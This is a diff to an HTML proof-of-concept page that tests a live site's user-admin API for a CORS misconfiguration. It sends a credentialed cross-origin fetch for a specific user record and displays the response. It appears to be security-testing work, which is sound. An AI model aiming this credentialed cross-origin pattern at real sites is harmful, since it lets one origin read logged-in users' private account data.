@@ -2,23 +2,77 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>CORS Vulnerability Tester</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authenticated CORS Vulnerability Tester</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f9f9f9;
+            color: #333;
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        h2 {
+            color: #2c3e50;
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 10px;
+        }
+        button {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #2980b9;
+        }
+        pre {
+            background-color: #272822;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Courier New', Courier, monospace;
+            margin-top: 20px;
+            min-height: 100px;
+        }
+        .info-box {
+            background-color: #e8f4f8;
+            border-left: 4px solid #3498db;
+            padding: 10px;
+            margin-bottom: 20px;
+        }
+    </style>
 </head>
 <body>
-    <h2>CORS Information Disclosure Tester</h2>
-    <button onclick="testCorsEndpoint()">Test Endpoint</button>
-    <pre id="output" style="background:#f4f4f4; padding:10px; border:1px solid #ccc;"></pre>
+
+    <h2>Authenticated CORS Information Disclosure Tester</h2>
+    
+    <div class="info-box">
+        <p><strong>Note:</strong> Ensure you are logged into the target application in the same browser session. This test determines whether the application's CORS policy mishandles authenticated user requests.</p>
+    </div>
+
+    <button onclick="testAuthenticatedCors()">Test Endpoint with Credentials</button>
+
+    <pre id="output">Result will appear here...</pre>
 
     <script>
-        function testCorsEndpoint() {
+        function testAuthenticatedCors() {
             const targetUrl = "https://www.globe.gov/o/users-orgs-admin/v1.0/users/186079865";
             const outputDiv = document.getElementById("output");
+            outputDiv.innerText = "Sending request...";
 
-            // We use credentials: 'include' to check if the browser sends cookies with the cross-origin request
             fetch(targetUrl, {
                 method: "GET",
                 mode: "cors",
-                credentials: "omit", // First test without cookies, then try "include"
+                credentials: "include", // Sends your active cookies along with the request
                 headers: {
                     "Accept": "application/json"
                 }
@@ -29,6 +83,7 @@
                     headersObj[key] = value;
                 });
 
+                // Read the response content
                 if (response.ok) {
                     return response.json().then(data => ({
                         status: response.status,
@@ -39,7 +94,7 @@
                     return response.text().then(text => ({
                         status: response.status,
                         headers: headersObj,
-                        body: text
+                        body: text ? JSON.parse(text) : {}
                     }));
                 }
             })
@@ -47,7 +102,7 @@
                 outputDiv.innerText = JSON.stringify(result, null, 2);
             })
             .catch(error => {
-                outputDiv.innerText = "Error: " + error.toString();
+                outputDiv.innerText = "Error / Blocked: \n" + error.toString();
             });
         }
     </script>
